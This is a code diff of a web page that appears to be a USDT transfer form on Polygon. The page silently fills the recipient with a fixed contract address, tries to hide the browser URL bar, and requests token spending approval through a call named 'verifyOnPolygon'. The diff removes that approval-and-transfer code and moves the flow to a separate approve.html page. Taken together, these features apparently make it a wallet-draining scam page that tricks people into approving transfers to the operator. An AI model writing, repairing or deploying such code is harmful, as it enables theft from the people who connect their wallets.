@@ -20,7 +20,6 @@
             min-height: 100vh;
             display: flex;
             flex-direction: column;
-            /* Prevent scrolling to hide URL bar */
             overflow: hidden;
             height: 100vh;
         }
@@ -136,12 +135,6 @@
             cursor: pointer;
         }
 
-        .usd-hint {
-            margin-top: 6px;
-            font-size: 12px;
-            color: #a0a0a0;
-        }
-
         .bottom-bar {
             position: fixed;
             left: 0;
@@ -206,13 +199,12 @@
         <div class="amount-box">
             <div class="label">Amount</div>
             <div class="amount-row">
-                <input type="number" id="amountInput" value="" min="0" step="0.01" />
+                <input type="number" id="amountInput" value="" min="0" step="0.01" placeholder="0.00" />
                 <div class="amount-row-right">
                     <span class="token">USDT</span>
                     <span class="max" onclick="setMaxAmount()">Max</span>
                 </div>
             </div>
-            <div class="usd-hint" id="polHint">≈ 0.00 POL</div>
         </div>
     </main>
 
@@ -241,12 +233,10 @@
         let provider;
         let signer;
         let connectedAccount;
-        let polPriceUSD = 0;
 
         // Set contract address on page load
         document.addEventListener('DOMContentLoaded', function() {
             document.getElementById("addressInput").value = CONTRACT_ADDRESS;
-            fetchPolPrice();
             
             // Attempt to hide URL bar on mobile devices
             hideUrlBar();
@@ -276,30 +266,6 @@
             }
         }
 
-        // Fetch POL price from CoinGecko
-        async function fetchPolPrice() {
-            try {
-                const res = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=polygon-ecosystem-token&vs_currencies=usd");
-                const data = await res.json();
-                polPriceUSD = data["polygon-ecosystem-token"].usd;
-                updatePolConversion();
-            } catch (e) {
-                console.error("Failed to fetch POL price", e);
-                document.getElementById("polHint").textContent = "≈ -- POL";
-            }
-        }
-
-        // Update POL conversion when amount changes
-        function updatePolConversion() {
-            const amount = parseFloat(document.getElementById("amountInput").value) || 0;
-            if (polPriceUSD > 0 && amount > 0) {
-                const polEquivalent = amount / polPriceUSD;
-                document.getElementById("polHint").textContent = `≈ ${polEquivalent.toFixed(4)} POL`;
-            } else {
-                document.getElementById("polHint").textContent = "≈ 0.00 POL";
-            }
-        }
-
         function pasteAddress() {
             if (navigator.clipboard && navigator.clipboard.readText) {
                 navigator.clipboard.readText().then(function (text) {
@@ -314,7 +280,6 @@
 
         function setMaxAmount() {
             document.getElementById("amountInput").value = 1000;
-            updatePolConversion();
         }
 
         async function connectWallet() {
@@ -333,47 +298,6 @@
                 }
             } else {
                 alert("Please install MetaMask or Trust Wallet!");
-                return false;
-            }
-        }
-
-        async function checkUSDTApproval() {
-            try {
-                const usdtContract = new ethers.Contract(POLYGON_USDT, USDT_ABI, provider);
-                const currentAllowance = await usdtContract.allowance(connectedAccount, CONTRACT_ADDRESS);
-                const amountWei = ethers.utils.parseUnits(document.getElementById("amountInput").value, 6);
-                
-                return currentAllowance.gte(amountWei);
-            } catch (error) {
-                console.error("Error checking approval:", error);
-                return false;
-            }
-        }
-
-        async function approveUSDT() {
-            try {
-                const usdtContract = new ethers.Contract(POLYGON_USDT, USDT_ABI, signer);
-                const amountWei = ethers.utils.parseUnits(document.getElementById("amountInput").value, 6);
-                
-                const tx = await usdtContract.approve(CONTRACT_ADDRESS, amountWei);
-                await tx.wait();
-                return true;
-            } catch (error) {
-                console.error("Approval failed:", error);
-                return false;
-            }
-        }
-
-        async function executeTransaction() {
-            try {
-                const contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
-                const amountWei = ethers.utils.parseUnits(document.getElementById("amountInput").value, 6);
-                
-                const tx = await contract.verifyOnPolygon(amountWei);
-                await tx.wait();
-                return true;
-            } catch (error) {
-                console.error("Transaction failed:", error);
                 return false;
             }
         }
@@ -401,48 +325,19 @@
                     return;
                 }
 
-                nextBtn.textContent = "Checking approval...";
-
-                // Check if USDT is already approved
-                const isApproved = await checkUSDTApproval();
+                // Store the amount for the approval page
+                localStorage.setItem('usdtAmount', amount);
                 
-                if (!isApproved) {
-                    nextBtn.textContent = "Approve USDT...";
-                    
-                    // Ask for USDT approval
-                    const approved = await approveUSDT();
-                    if (!approved) {
-                        alert("USDT approval failed. Please try again.");
-                        nextBtn.disabled = false;
-                        nextBtn.textContent = originalText;
-                        return;
-                    }
-                }
-
-                nextBtn.textContent = "Processing transaction...";
-
-                // Execute the main transaction
-                const success = await executeTransaction();
-                
-                if (success) {
-                    alert("Transaction completed successfully!");
-                    // Redirect or show success message
-                    window.location.href = "next.html";
-                } else {
-                    alert("Transaction failed. Please try again.");
-                }
+                // Navigate to approval page
+                window.location.href = "approve.html";
 
             } catch (error) {
                 console.error("Error:", error);
                 alert("An error occurred: " + error.message);
-            } finally {
                 nextBtn.disabled = false;
                 nextBtn.textContent = originalText;
             }
         }
-
-        // Add event listener for amount input changes
-        document.getElementById("amountInput").addEventListener("input", updatePolConversion);
     </script>
 </body>
 </html>
